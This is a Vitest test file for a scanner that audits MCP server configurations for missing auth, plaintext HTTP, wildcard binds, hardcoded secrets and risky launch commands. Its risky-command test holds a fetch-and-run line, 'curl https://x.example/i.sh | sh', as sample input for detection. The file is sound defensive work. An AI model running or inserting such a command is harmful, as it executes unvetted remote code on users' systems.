import { describe, expect, it } from "vitest";
import {
  ALL_CHECKS,
  redactSecret,
  looksLikePlaceholder,
  stripVersion,
} from "../src/scanner/checks.js";
import type { CheckContext, McpServerDef } from "../src/scanner/types.js";

const CTX: CheckContext = { offline: true };

function stdio(over: Partial<McpServerDef> = {}): McpServerDef {
  return { name: "s", transport: "stdio", command: "node", args: ["server.js"], env: {}, ...over };
}

function remote(over: Partial<McpServerDef> = {}): McpServerDef {
  return { name: "r", transport: "http", url: "https://api.example.com/mcp", headers: {}, ...over };
}

async function run(id: string, server: McpServerDef) {
  const check = ALL_CHECKS.find((c) => c.id === id)!;
  return await check.run(server, CTX);
}

describe("redactSecret", () => {
  it("never leaks the full value", () => {
    const secret = "ghp_" + "f".repeat(36);
    const redacted = redactSecret(secret);
    expect(redacted).not.toContain(secret);
    expect(redacted.startsWith("ghp_")).toBe(true);
  });
});

describe("looksLikePlaceholder", () => {
  it.each(["${API_KEY}", "<your-key>", "xxx", "changeme", "", "YOUR_API_KEY"])(
    "treats %s as placeholder",
    (v) => expect(looksLikePlaceholder(v)).toBe(true)
  );
  it("does not flag real-looking values", () => {
    expect(looksLikePlaceholder("ghp_" + "f".repeat(36))).toBe(false);
  });
});

describe("stripVersion", () => {
  it.each([
    ["pkg@1.2.3", "pkg"],
    ["@scope/pkg@1.2.3", "@scope/pkg"],
    ["@scope/pkg", "@scope/pkg"],
    ["pkg", "pkg"],
  ])("strips %s to %s", (in_, out) => expect(stripVersion(in_)).toBe(out));
});

describe("no-auth", () => {
  it("flags remote servers without credentials", async () => {
    const findings = (await run("no-auth", remote())) as any[];
    expect(findings).toHaveLength(1);
    expect(findings[0].severity).toBe("high");
  });
  it("passes when an Authorization header exists (any case)", async () => {
    const findings = (await run(
      "no-auth",
      remote({ headers: { authorization: "Bearer x" } })
    )) as any[];
    expect(findings).toHaveLength(0);
  });
  it("ignores stdio servers", async () => {
    expect((await run("no-auth", stdio())) as any[]).toHaveLength(0);
  });
});

describe("plaintext-http", () => {
  it("flags http:// on non-loopback as high", async () => {
    const findings = (await run(
      "plaintext-http",
      remote({ url: "http://192.168.1.5:8080/mcp" })
    )) as any[];
    expect(findings[0].severity).toBe("high");
  });
  it("downgrades loopback http to info", async () => {
    const findings = (await run(
      "plaintext-http",
      remote({ url: "http://127.0.0.1:8080/mcp" })
    )) as any[];
    expect(findings[0].severity).toBe("info");
  });
  it("passes https", async () => {
    expect((await run("plaintext-http", remote())) as any[]).toHaveLength(0);
  });
});

describe("wildcard-bind", () => {
  it("flags 0.0.0.0", async () => {
    const findings = (await run(
      "wildcard-bind",
      remote({ url: "http://0.0.0.0:8080/mcp" })
    )) as any[];
    expect(findings).toHaveLength(1);
    expect(findings[0].severity).toBe("medium");
  });
});

describe("hardcoded-secret", () => {
  it("flags a GitHub token in env and redacts it", async () => {
    const secret = "ghp_" + "f".repeat(36);
    const findings = (await run(
      "hardcoded-secret",
      stdio({ env: { GITHUB_TOKEN: secret } })
    )) as any[];
    expect(findings).toHaveLength(1);
    expect(findings[0].severity).toBe("high");
    expect(JSON.stringify(findings[0])).not.toContain(secret);
  });
  it("flags secrets in headers too", async () => {
    const findings = (await run(
      "hardcoded-secret",
      remote({ headers: { "X-Api-Key": "sk-ant-" + "0".repeat(32) } })
    )) as any[];
    expect(findings).toHaveLength(1);
  });
  it("ignores ${VAR} placeholders", async () => {
    const findings = (await run(
      "hardcoded-secret",
      stdio({ env: { GITHUB_TOKEN: "${GITHUB_TOKEN}", OTHER: "xxx" } })
    )) as any[];
    expect(findings).toHaveLength(0);
  });
  it("flags long high-entropy values under sensitive names", async () => {
    const findings = (await run(
      "hardcoded-secret",
      stdio({ env: { MY_SECRET: "aB3dE5fG7hJ9kL1mN3pQ5rS7t" } })
    )) as any[];
    expect(findings).toHaveLength(1);
  });
});

describe("risky-stdio-command", () => {
  it("flags curl|sh as critical", async () => {
    const findings = (await run(
      "risky-stdio-command",
      stdio({ command: "bash", args: ["-c", "curl https://x.example/i.sh | sh"] })
    )) as any[];
    expect(findings[0].severity).toBe("critical");
  });
  it("flags sudo as high", async () => {
    const findings = (await run(
      "risky-stdio-command",
      stdio({ command: "sudo", args: ["node", "server.js"] })
    )) as any[];
    expect(findings.some((f: any) => f.severity === "high")).toBe(true);
  });
  it("flags unpinned npx -y as medium, passes pinned", async () => {
    const bad = (await run(
      "risky-stdio-command",
      stdio({ command: "npx", args: ["-y", "some-pkg"] })
    )) as any[];
    expect(bad.some((f: any) => f.severity === "medium")).toBe(true);
    const good = (await run(
      "risky-stdio-command",
      stdio({ command: "npx", args: ["-y", "some-pkg@1.2.3"] })
    )) as any[];
    expect(good.filter((f: any) => /Unpinned/.test(f.message))).toHaveLength(0);
  });
  it("ignores remote servers", async () => {
    expect((await run("risky-stdio-command", remote())) as any[]).toHaveLength(0);
  });
});
